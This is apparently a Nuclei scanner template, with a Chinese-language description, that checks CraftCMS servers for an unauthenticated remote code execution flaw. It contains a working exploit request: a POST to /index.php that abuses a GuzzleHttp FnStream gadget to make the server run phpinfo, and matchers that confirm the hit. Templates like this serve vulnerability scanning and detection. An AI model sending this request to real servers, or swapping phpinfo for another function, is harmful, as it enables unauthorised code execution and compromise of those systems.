id: craftcms-unauth-rce

info:
  name: "CraftCMS 未经身份验证远程代码执行漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    CraftCMS 系统中存在一处未经身份验证的远程代码执行漏洞，攻击者可通过特定请求路径在目标服务器上执行任意代码。该漏洞的披露日期为 2023-12-04。
  tags: CraftCMS

http:
- raw:
  - |
    POST /index.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'PHP Version'
